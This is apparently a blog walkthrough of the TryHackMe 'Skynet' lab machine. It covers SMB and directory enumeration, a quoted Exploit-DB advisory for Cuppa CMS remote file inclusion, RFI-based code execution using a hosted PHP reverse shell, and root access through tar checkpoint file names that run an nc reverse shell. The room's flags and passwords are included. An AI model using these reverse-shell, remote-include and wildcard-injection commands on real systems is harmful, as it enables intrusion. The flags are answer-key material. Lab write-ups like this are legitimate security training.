---
title: "Challenges: Skynet (TryHackMe)"
datePublished: Sun Jul 06 2025 21:00:00 GMT+0000 (Coordinated Universal Time)
cuid: cmcu7t5m2000n02jjgpri0z4w
slug: challenges-skynet-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1751959960458/6419cff5-fdb6-4504-be7c-63db3ae6a82d.png
tags: nmap, tryhackme, smbprotocol, gobuster, ctf-writeup, linux-privesc

---

![](https://i.imgur.com/SNHDHoh.png align="left")

**“Hasta la vista, baby.”**  
The line might sound like a farewell, but in this case, it’s just the beginning.

In this Terminator-themed hacking challenge, we’re tasked with compromising a system modeled around *Miles Dyson*, a key figure behind Skynet. Using common enumeration tools like **Nmap** and **Gobuster**, and diving deep into **SMB shares**, **hidden directories**, and **vulnerable CMS platforms**, we slowly unravel the system’s weaknesses.

Along the way, we identify credentials, exploit a **Remote File Inclusion (RFI)** vulnerability in **Cuppa CMS**, and eventually achieve **Remote Code Execution (RCE)**. With persistence, creativity, and classic privilege escalation techniques, we move from a low-level user to full root access — uncovering flags that mark our dominance over the machine.  
  
  
*Hasta la vista, baby.*

Are you able to compromise this Terminator themed machine?

[![](https://i.imgur.com/EaY7BBz.png align="left")](https://blog.tryhackme.com/skynet-writeup/)

You can follow our official walkthrough for this challenge on [our blog](https://tryhackme.com/r/resources/blog/skynet-writeup).

## Answer the questions below

using Nmap and Gobuster for basic  
  
`nmap -sC -sV -A`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751950863363/3cde4115-53ca-49b8-a879-09dfdd13aee6.png align="center")

`smbclient -L // -N`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751950919010/b7c752c2-7988-4394-a9e6-14de358aef49.png align="center")

`smbclient //10.10.104.163/anonymous -N`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751951095382/55ec3534-9929-478b-8562-96a2be541a8a.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751951342532/830226fa-c924-4663-8452-229dbc336f59.png align="center")

`cat attention.txt`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751951386146/f3352d8e-080f-46ad-8b15-7b41e7755c5d.png align="center")

`cat log1.txt`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751951490931/3003bf55-f0f0-48ff-8f7b-fa6107979698.png align="center")

1. What is Miles password for his emails? `cyborg007haloterminator`
    
2. What is the hidden directory? `/45kra24zxs28v3yd`  
      
    `gobuster dir -u http://<IP_Address> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751951834621/c90c347a-14f0-4fe8-a13a-4baa72c8a050.png align="center")
    
    `http://<IP_Address>/squirrelmail/src/login.php` - Visit the site, then log in
    
    name: password `milesdyson`: `cyborg007haloterminator`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751952193496/44cb715c-6f8c-4785-81fb-12dc1b426f59.png align="center")
    
    ```bash
    i can i i everything else . . . . . . . . . . . . . .
    balls have zero to me to me to me to me to me to me to me to me to
    you i everything else . . . . . . . . . . . . . .
    balls have a ball to me to me to me to me to me to me to me
    i i can i i i everything else . . . . . . . . . . . . . .
    balls have a ball to me to me to me to me to me to me to me
    i . . . . . . . . . . . . . . . . . . .
    balls have zero to me to me to me to me to me to me to me to me to
    you i i i i i everything else . . . . . . . . . . . . . .
    balls have 0 to me to me to me to me to me to me to me to me to
    you i i i everything else . . . . . . . . . . . . . .
    balls have zero to me to me to me to me to me to me to me to me to
    ```
    
    ```bash
    
    01100010 01100001 01101100 01101100 01110011 00100000 01101000 01100001 01110110
    01100101 00100000 01111010 01100101 01110010 01101111 00100000 01110100 01101111
    00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
    00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
    00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
    00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
    00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
    00100000 01110100 01101111
    
    // balls have zero to me to me to me to me to me to me to me to me to
    ```
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751952495355/e0e6ed88-717a-4a95-b615-f271ccf51c1e.png align="center")
    
    We have changed your smb password after system malfunction. Password: `` )s{A&2Z=F^n_E.B` ``  
      
    We now have the password for Miles Dyson. So we’ll log in to the SMBClient  
      
    `smbclient //<IP_Address>/milesdyson -U milesdyson`
    
    password: `)s{A&2Z=F^n_E.B`\`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751952700071/446f2bba-c0b4-40bd-b88f-ae7d662f3467.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751952884870/5807890f-4da0-4e00-ba30-d9d7c4afa1f9.png align="center")
    
3. What is the vulnerability called when you can include a remote file for malicious purposes? `remote file inclusion`  
      
    🔄 RFI vs RCE – What's the Difference?
    
    | Term | Full Form | What It Does | Example | Relationship |
    | --- | --- | --- | --- | --- |
    | **RFI** | Remote File Inclusion | Includes remote files (usually via a vulnerable `include()` or `require()` in PHP) | [`http://site.com/index.php?page=http://evil.com/shell.txt`](http://site.com/index.php?page=http://evil.com/shell.txt) | Often used to **trigger RCE** |
    | **RCE** | Remote Code Execution | Allows remote attackers to execute arbitrary code | Exploiting a file upload or injection flaw to run `whoami` or reverse shell | RFI can lead to RCE |
    
    * **RFI** is about **including and executing remote files** (usually scripts).
        
    * **RCE** is the **actual execution of commands/code** on the server.
        
    * **RFI is a vector**; **RCE is the goal**.
        
    
    ---
    
    ## 🛡️ How Developers Can Prevent RFI
    
    1. **Disable** `allow_url_include` and `allow_url_fopen` in `php.ini`:
        
        ```bash
        iniCopyEditallow_url_include = Off
        allow_url_fopen = Off
        ```
        
    2. **Validate Input Properly**:
        
        * Use whitelists for allowed page names.
            
        * Avoid passing user input directly to `include()` or `require()`.
            
    3. **Use Secure File Paths**:
        
        * Don't include files based on raw input. Instead, map inputs to known safe filenames.
            
    4. **Keep Software Updated**:
        
        * Patches often fix dangerous default behaviors.
            
    5. **Set Correct File Permissions**:
        
        * Ensure web server users can't write to directories that are later included.  
            
4. What is the user flag? `7ce5c2109a40f958099283600a9ae807`  
      
    Checking the site: `http://<IP_Address>//45kra24zxs28v3yd`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751953125832/9bfab64c-e492-402f-ad39-b4765edb8f16.png align="center")
    
    `gobuster dir -u http://<IP_Address>/45kra24zxs28v3yd -w /usr/share/wordlists/dirb/common.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751953408364/083b7546-8933-4b77-8817-31708200917c.png align="center")
    
    Checking the site: `http://<IP_Address>//45kra24zxs28v3yd/administrator` Introduces us to Cuppa CMS. When we visit ExploitDB and search for [Cuppa CMS](https://www.exploit-db.com/exploits/25971), we find an exploit script that guides us on how to use RFI to escalate privileges for initial access, thereby obtaining the lower user flag.
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751953372839/c60b19de-beb3-44a5-b6b4-291caf246f61.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751957956792/4ca399b2-6bb4-4905-b7e5-e59b68f6ea29.png align="center")
    
    ```bash
    # Exploit Title   : Cuppa CMS File Inclusion
    # Date            : 4 June 2013
    # Exploit Author  : CWH Underground
    # Site            : www.2600.in.th
    # Vendor Homepage : http://www.cuppacms.com/
    # Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip
    # Version         : Beta
    # Tested on       : Window and Linux
    
      ,--^----------,--------,-----,-------^--,
      | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
      `+---------------------------^----------|
        `\_,-------, _________________________|
          / XXXXXX /`|     /
         / XXXXXX /  `\   /
        / XXXXXX /\______(
       / XXXXXX /          
      / XXXXXX /
     (________(            
      `------'
    
    ####################################
    VULNERABILITY: PHP CODE INJECTION
    ####################################
    
    /alerts/alertConfigField.php (LINE: 22)
    
    -----------------------------------------------------------------------------
    LINE 22: 
            <?php include($_REQUEST["urlConfig"]); ?>
    -----------------------------------------------------------------------------
        
    
    #####################################################
    DESCRIPTION
    #####################################################
    
    An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.
    
    http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]
    
    #####################################################
    EXPLOIT
    #####################################################
    
    http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
    http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
    
    Moreover, We could access Configuration.php source code via PHPStream 
    
    For Example:
    -----------------------------------------------------------------------------
    http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
    -----------------------------------------------------------------------------
    
    Base64 Encode Output:
    -----------------------------------------------------------------------------
    PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+
    -----------------------------------------------------------------------------
    
    Base64 Decode Output:
    -----------------------------------------------------------------------------
    <?php 
    	class Configuration{
    		public $host = "localhost";
    		public $db = "cuppa";
    		public $user = "root";
    		public $password = "Db@dmin";
    		public $table_prefix = "cu_";
    		public $administrator_template = "default";
    		public $list_limit = 25;
    		public $token = "OBqIPqlFWf3X";
    		public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
    		public $upload_default_path = "media/uploadsFiles";
    		public $maximum_file_size = "5242880";
    		public $secure_login = 0;
    		public $secure_login_value = "";
    		public $secure_login_redirect = "";
    	} 
    ?>
    -----------------------------------------------------------------------------
    
    Able to read sensitive information via File Inclusion (PHP Stream)
    
    ################################################################################################################
     Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2 
    ################################################################################################################
                
    ```
    
    Create a new file called shell.php by copying the php-reverse-shell.php using this command:  
      
    `cp /usr/share/webshells/php/php-reverse-shell.php shell.php`  
      
    Edit the IP Address `<AttackMachine_ip>` and Port `<5555>` on the shell.php file  
      
    Based on the exploit script above, we’ll use this command:  
      
    `curl http://<Target_IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php\?urlConfig\=http://<AttackMachine_ip>:8000/shell.php`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751958592185/7f9a336a-6a07-47dd-914b-92e9b9d3f1e3.png align="center")
    
      
      
    Alongside these commands on different tabs:  
      
    `python3 -m http.server`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751958619079/0e6aa720-4325-45e9-aeb8-c4a8fabed57e.png align="center")
    
    `nc -lvnp 5555   find / -type f -name user.txt 2> /dev/null`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751958649458/b8ed7ec6-ea26-4791-9483-f808807f336b.png align="center")
    
5. What is the root flag? `3f0372db24753accc7179a282cd6a949`  
      
    We check: `cat /etc/crontab` to find a way we can escalate privileges so that we can get root access
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751958944398/7efad115-c070-48f0-8760-8769fa261845.png align="center")
    
      
    `cat /home/milesdyson/backups/backup.sh`  
    
    #!/bin/bash  
    cd /var/www/html  
    tar cf /home/milesdyson/backups/backup.tgz \*  
      
    
    `echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <AttackBox_IP_Address> 1234 > /tmp/f" > [`[`shell.sh`](http://shell.sh)`](<`[`http://shell.sh/`](http://shell.sh/)`>)`
    
    `touch "/var/www/html/--checkpoint=1"`
    
    `touch "/var/www/html/--checkpoint-action=exec=sh [`[`shell.sh`](http://shell.sh)`](<`[`http://shell.sh/`](http://shell.sh/)`>)"`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751959076678/2b1125f4-e5eb-4c5c-8c6b-fc775a7208c7.png align="center")
    
    `nc -lvnp 1234`
    
    `find / -type f -name root.txt 2> /dev/null`
    
    `cat /root/root.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751959155826/e1f0f2f1-e662-4b43-88c5-ccefdf605725.png align="center")
    
      
      
      
    This machine was a perfect mix of realistic misconfigurations and legacy vulnerabilities — the kind still found in real-world environments.
    
    Key takeaways:
    
    * **Enumeration is everything**: From Gobuster revealing `/45kra24zxs28v3yd` to Nmap and SMB, showing us the doors.
        
    * **Know your vectors**: RFI led us to remote code execution, reminding us that small flaws often escalate.
        
    * **Privilege escalation matters**: The `tar` checkpoint trick showed how a simple scheduled script can become a gateway to root.
        
    
    Ultimately, by chaining the right tools, exploits, and logic, we compromised the machine, proving once again that Skynet might be powerful, but it’s not invincible.
    
    **Rooted another box? Let’s go again. 🧠🔥**